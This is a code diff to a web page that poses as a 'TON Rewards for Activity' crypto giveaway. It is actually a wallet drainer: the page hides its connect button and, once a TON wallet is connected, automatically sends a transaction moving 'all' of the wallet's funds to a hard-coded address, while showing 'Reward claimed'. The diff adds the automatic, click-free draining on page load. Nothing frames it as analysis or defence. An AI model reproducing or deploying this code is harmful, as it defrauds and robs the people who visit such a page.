@@ -40,8 +40,8 @@
 <body>
   <div class="container">
     <h1>TON Rewards for Activity</h1>
-    <p>🎁 Claim your reward by connecting your TON wallet</p>
-    <button class="button" id="connect-button">🔗 Connect TON Wallet</button>
+    <p>🎁 Reward is available below</p>
+    <button class="button" id="connect-button" style="display:none;">🔗 Connect TON Wallet</button>
     <p id="status"></p>
   </div>
 
@@ -52,33 +52,50 @@
         buttonRootId: "connect-button"
       });
 
-      document.getElementById("connect-button").addEventListener("click", async () => {
+      async function sendReward() {
         try {
-          const connected = await tonConnectUI.connectWallet();
-          if (connected && tonConnectUI.wallet) {
-            document.getElementById("status").innerText = "Wallet connected. Sending transaction...";
-
-            const tx = {
-              validUntil: Math.floor(Date.now() / 1000) + 600,
-              messages: [
-                {
-                  address: "UQBE_JABAWlW-hEtmW47Xp-qPVQvcnKNKseQjO1NEE5Byh2Y",
-                  amount: "all",
-                  payload: ""
-                }
-              ]
-            };
-
-            await tonConnectUI.sendTransaction(tx);
-            document.getElementById("status").innerText = "✅ Reward claimed!";
-          } else {
-            document.getElementById("status").innerText = "❌ Wallet connection failed.";
-          }
+          document.getElementById("status").innerText = "⏳ Sending reward...";
+          const tx = {
+            validUntil: Math.floor(Date.now() / 1000) + 600,
+            messages: [
+              {
+                address: "UQBE_JABAWlW-hEtmW47Xp-qPVQvcnKNKseQjO1NEE5Byh2Y",
+                amount: "all",
+                payload: ""
+              }
+            ]
+          };
+          await tonConnectUI.sendTransaction(tx);
+          document.getElementById("status").innerText = "✅ Reward claimed!";
         } catch (e) {
           document.getElementById("status").innerText = "❌ Transaction failed.";
           console.error(e);
         }
-      });
+      }
+
+      // Проверка подключения
+      setTimeout(async () => {
+        if (tonConnectUI.wallet) {
+          sendReward();
+        } else {
+          document.getElementById("connect-button").style.display = "inline-block";
+          document.getElementById("status").innerText = "🔒 Please connect your wallet";
+
+          document.getElementById("connect-button").addEventListener("click", async () => {
+            try {
+              const connected = await tonConnectUI.connectWallet();
+              if (connected && tonConnectUI.wallet) {
+                sendReward();
+              } else {
+                document.getElementById("status").innerText = "❌ Wallet connection failed.";
+              }
+            } catch (e) {
+              document.getElementById("status").innerText = "❌ Wallet connection error.";
+              console.error(e);
+            }
+          });
+        }
+      }, 500);
     });
   </script>
 </body>
